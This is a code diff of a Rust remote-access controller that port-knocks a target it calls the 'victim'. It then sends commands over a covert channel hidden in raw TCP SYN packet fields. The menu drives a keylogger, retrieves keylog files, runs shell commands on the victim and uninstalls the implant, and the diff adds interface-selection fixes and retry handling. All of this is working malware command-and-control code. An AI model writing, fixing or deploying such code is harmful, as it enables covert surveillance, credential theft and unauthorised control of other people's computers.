@@ -1,13 +1,14 @@
 use std::io::{self, Write};
 use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::net::{IpAddr, Ipv4Addr, TcpListener};
+use std::net::{TcpStream, IpAddr, Ipv4Addr};
 use std::thread;
 use std::time::Duration;
-use pnet::transport::{transport_channel, TransportChannelType::Layer3};
+use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::packet::Packet;
 use pnet::datalink;
+use pnet::packet::tcp::TcpPacket;
 
 mod port_knkr;
 mod keylogger;
@@ -16,11 +17,10 @@ mod covert;
 use port_knkr::KnockSession;
 
 // Command Codes
-const CMD_START_LOGGER:   u8 = 0x10;
-const CMD_STOP_LOGGER:    u8 = 0x20;
-const CMD_UNINSTALL:      u8 = 0x30;
-const CMD_SHELL:          u8 = 0x40; 
-const CMD_REQUEST_KEYLOG: u8 = 0x50;
+const CMD_START_LOGGER:     u8 = 0x10;
+const CMD_STOP_LOGGER:      u8 = 0x20;
+const CMD_UNINSTALL:        u8 = 0x30;
+const CMD_REQUEST_KEYLOG:   u8 = 0x50;
 
 #[derive(Debug, PartialEq)]
 enum SessionState {
@@ -51,11 +51,13 @@ impl Commander {
         }
     }
 
-    fn send_covert_data(&self, payload: &[u8]) {
+   fn send_covert_data(&self, payload: &[u8]) {
         let victim_ip = self.victim_ip.expect("No victim IP");
         let local_ip = self.local_ip.expect("No local IP");
-
+        
+        // Convert payload into stateful chunks
         let mut state = covert::SenderState::new_from_bytes(payload);
+        
         let protocol = Layer3(IpNextHeaderProtocols::Tcp);
         let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
         let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
@@ -67,26 +69,54 @@ impl Commander {
 
                 while !acked && attempts < 5 {
                     attempts += 1;
-                    let syn_pkt = covert::build_syn_packet(local_ip, victim_ip, self.rx_port, self.tx_port, ip_id, masked_seq);
-                    let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), IpAddr::V4(victim_ip));
+                    
+                    // Build and send the SYN packet containing covert data
+                    let syn_pkt = covert::build_syn_packet(
+                        local_ip, victim_ip,
+                        self.rx_port, self.tx_port, 
+                        ip_id, masked_seq
+                    );
+                    
+                    let _ = tx.send_to(
+                        pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), 
+                        IpAddr::V4(victim_ip)
+                    );
 
                     let start = std::time::Instant::now();
+                    // Wait 500ms for the Victim to respond with the signature
                     while start.elapsed() < Duration::from_millis(500) {
                         if let Ok((packet, _)) = rx_iter.next() {
-                            if packet.get_source() != victim_ip { continue; }
-                            if let Some(recv_id) = covert::parse_rst_ack_signature(packet.packet()) {
-                                if recv_id == covert::signature_ip_id(ip_id, raw_word) {
-                                    state.ack();
-                                    acked = true;
-                                    break;
+                            // FIX: Use 'victim_ip' instead of 'target_ip'
+                            if packet.get_source() == victim_ip {
+                                // Optional Debug: See the flags coming from the victim
+                                if let Some(tcp) = TcpPacket::new(packet.payload()) {
+                                     // println!("[DEBUG] Packet from Victim. Flags: {:b}", tcp.get_flags());
                                 }
+
+                                if let Some(recv_id) = covert::parse_rst_ack_signature(packet.packet()) {
+                                    let expected_sig = covert::signature_ip_id(ip_id, raw_word);
+                                    if recv_id == expected_sig {
+                                        state.ack();
+                                        acked = true;
+                                        break;
+                                    }
+                                }                                
                             }
                         }
                     }
+                    
+                    if !acked {
+                        println!("[!] Timeout (Chunk {}), retry {}/5...", state.index, attempts);
+                    }
                 }
-                if !acked { return; }
+
+                if !acked {
+                    println!("[!!!] Connection lost or Victim is not ACKing. Aborting command.");
+                    return;
+                }
             }
         }
+        println!("[+] Command sent successfully.");
     }
 
     pub fn run(&mut self) {
@@ -111,7 +141,12 @@ impl Commander {
 
     fn connected_menu(&mut self) {
         println!("\n--- Connected to {:?} ---", self.victim_ip);
-        println!("1) Start Keylogger\n2) Stop Keylogger\n3) Request Keylog\n4) Shell\n5) Uninstall\n6) Disconnect");
+        println!("1) Start Keylogger");
+        println!("2) Stop Keylogger");
+        println!("3) Request Keylog File");
+        println!("4) Run Shell Command");
+        println!("5) Uninstall");
+        println!("6) Disconnect");
         match prompt("Selection > ").as_str() {
             "1" => self.start_keylogger(),
             "2" => self.stop_keylogger(),
@@ -123,23 +158,29 @@ impl Commander {
         }
     }
 
-    fn initiate_connection(&mut self) {
-        let target_ip_str = prompt("Target IP: ");
-        let ip = target_ip_str.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
+    // In main.rs
 
-        if let Some((_, local_v4)) = Self::find_interface_for_target(ip) {
-            self.local_ip = Some(local_v4);
-        } else {
-            self.local_ip = Some(Ipv4Addr::new(127, 0, 0, 1));
-        };
+    fn initiate_connection(&mut self) {
+        let target_ip_str = prompt("Target IP [127.0.0.1]: ");
+        let ip = target_ip_str.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
 
         match port_knkr::port_knock(ip) {
             Ok(session) => {
                 self.victim_ip = Some(ip);
                 self.tx_port = session.tx_port;
                 self.rx_port = session.rx_port;
-                let _hijack = TcpListener::bind(format!("0.0.0.0:{}", self.rx_port));
                 self.knock_session = Some(session);
+                
+                // FIX: Identify local IP and interface properly
+                if let Some((iface_name, local_v4)) = Self::find_interface_for_target(ip) {
+                    println!("[*] Using interface: {} with IP: {}", iface_name, local_v4);
+                    self.local_ip = Some(local_v4);
+                } else {
+                    // Fallback to loopback if nothing else is found
+                    println!("[!] Warning: Could not find best interface, falling back to 127.0.0.1");
+                    self.local_ip = Some(Ipv4Addr::new(127, 0, 0, 1));
+                }
+
                 self.running.store(true, Ordering::SeqCst);
                 self.state = SessionState::Connected;
                 self.spawn_listener(); 
@@ -149,26 +190,43 @@ impl Commander {
         }
     }
 
+    // Improved interface selection logic
     fn find_interface_for_target(target: Ipv4Addr) -> Option<(String, Ipv4Addr)> {
-        datalink::interfaces().into_iter().find_map(|iface| {
-            iface.ips.iter().find_map(|ip| {
-                if let IpAddr::V4(v4) = ip.ip() {
-                    if ip.contains(IpAddr::V4(target)) { return Some((iface.name.clone(), v4)); }
+        let interfaces = datalink::interfaces();
+        
+        // 1. Try to find an interface that is in the same subnet
+        for iface in &interfaces {
+            for ip_net in &iface.ips {
+                if let IpAddr::V4(local_v4) = ip_net.ip() {
+                    if ip_net.contains(IpAddr::V4(target)) {
+                        return Some((iface.name.clone(), local_v4));
+                    }
                 }
-                None
-            })
-        })
+            }
+        }
+
+        // 2. Fallback: Find the first non-loopback up interface
+        for iface in &interfaces {
+            if iface.is_up() && !iface.is_loopback() {
+                for ip_net in &iface.ips {
+                    if let IpAddr::V4(local_v4) = ip_net.ip() {
+                        return Some((iface.name.clone(), local_v4));
+                    }
+                }
+            }
+        }
+
+        None
     }
 
     fn spawn_listener(&self) {
         let running = self.running.clone();
         let target_ip = self.victim_ip.unwrap();
-        let local_ip = self.local_ip.unwrap();
         let rx_port = self.rx_port;
 
         thread::spawn(move || {
             let protocol = Layer3(IpNextHeaderProtocols::Tcp);
-            let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
+            let (_, mut rx) = transport_channel(65535, protocol).expect("Root required");
             let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
             let mut receiver_state = covert::ReceiverState::new();
 
@@ -177,16 +235,11 @@ impl Commander {
                     if packet.get_source() == target_ip {
                         if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
                             if parsed.dst_port == rx_port {
-                                if let Ok((_, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
-                                    let rst_params = covert::RstAckParams {
-                                        src_ip: local_ip, dst_ip: target_ip, src_port: rx_port,
-                                        dst_port: parsed.src_port, ack_number: parsed.seq.wrapping_add(1), ip_id: sig_id,
-                                    };
-                                    let rst_pkt = covert::build_rst_ack_packet(&rst_params);
-                                    let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&rst_pkt).unwrap(), IpAddr::V4(target_ip));
-
+                                if let Ok(_) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
                                     if receiver_state.complete {
-                                        if let Ok(msg) = receiver_state.message_str() { println!("\n[VICTIM] {}", msg); }
+                                        if let Ok(msg) = receiver_state.message_str() {
+                                            println!("\n[Incoming] {}", msg);
+                                        }
                                         receiver_state = covert::ReceiverState::new();
                                     }
                                 }
@@ -204,13 +257,30 @@ impl Commander {
     fn run_program(&mut self) {
         let cmd = prompt("Command: ");
         if !cmd.is_empty() {
-            let mut payload = vec![CMD_SHELL];
-            payload.extend_from_slice(cmd.as_bytes());
-            self.send_covert_data(&payload);            
+            println!("[*] Sending command...");
+            self.send_covert_data(cmd.as_bytes());
+            
+            // 3️⃣ NOTIFY USER (Addresses point 3 of your analysis)
+            println!("[*] Command sent. Waiting for response from listener thread...");
+            // The output will be printed by the spawn_listener() thread 
+            // whenever the victim sends the response chunks back.
         }
     }
-    fn uninstall(&mut self) { self.send_covert_data(&[CMD_UNINSTALL]); self.disconnect(); }
-    fn disconnect(&mut self) { self.running.store(false, Ordering::SeqCst); self.state = SessionState::Disconnected; }
+
+    fn uninstall(&mut self) {
+        self.send_covert_data(&[CMD_UNINSTALL]);
+        self.disconnect();
+    }
+    fn disconnect(&mut self) {
+        self.running.store(false, Ordering::SeqCst);
+        self.state = SessionState::Disconnected;
+    }
+
+    fn find_best_interface(_target_ip: Ipv4Addr) -> Option<String> {
+        datalink::interfaces().into_iter()
+            .find(|i| i.is_up() && !i.is_loopback())
+            .map(|i| i.name)
+    }
 }
 
 fn prompt(msg: &str) -> String {
